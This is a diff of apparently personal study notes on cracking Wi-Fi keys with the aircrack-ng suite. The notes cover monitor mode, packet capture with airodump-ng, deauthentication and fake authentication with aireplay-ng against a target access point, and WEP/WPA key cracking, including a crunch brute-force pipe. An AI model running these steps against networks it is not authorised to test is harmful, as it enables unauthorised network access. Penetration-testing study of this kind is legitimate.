@@ -1,6 +1,7 @@
 # Wireless Vulnerablities
 ## overview of tools 
 ### aircrack-ng  
+from this https://ubuntuforums.org/showthread.php?t=528276  
 ##### change wifi card from promiscuous to monitor mode.  
 1. `ifconfig`  
 2. `ifconfig wlan0 down`  
@@ -12,6 +13,7 @@
 ##### run airodump-ng
 1. `airodump-ng wlan0`  
 2. `airodump-ng --channel 1 --bssid 12:34:45:45:67:80 --write dump.pca wlan0`  
+##### seperate terminal  
 3. `sudo aireplay-ng -1 0 -e <target_essid> -a 00:09:5B:D7:43:A8 -h MY:MA:CA:DD:RE:SS <interface>` -1... '0' deauthenticates all clients. -e... ESSID of target access point. -a... MAC address of target access point. -h... MAC address of your choice. its either no mac filtering or mac filtering  
 Mac filtering is turned off  
 ```
@@ -28,7 +30,10 @@ Mac filtering is turned off
 ##### Decryption with "aircrack-ng" & "aircrack-ptw"  
 1. `sudo aircrack-ng <file_name>.cap`  
 2. `./aircrack-ptw <file_name>.cap`  
+`crunch 10 10 -t %%%%%%%123 | aircrack-ng -w - SCAN-test.cap -e <essid>`
 [Aircrack-ng](http://aircrack-ng.org/doku.php?id=aircrack-ng)
+https://www.aircrack-ng.org/doku.php?id=cracking_wpa  
+
 ```
 Aircrack-NG:
 64-bit key: ~250,000 packets
@@ -38,3 +43,6 @@ Aircrack-PTW:
 64-bit key: ~20,000 packets [estimate]
 128-bit key: ~85,000 packets
 ```
+
+#### from video  
+
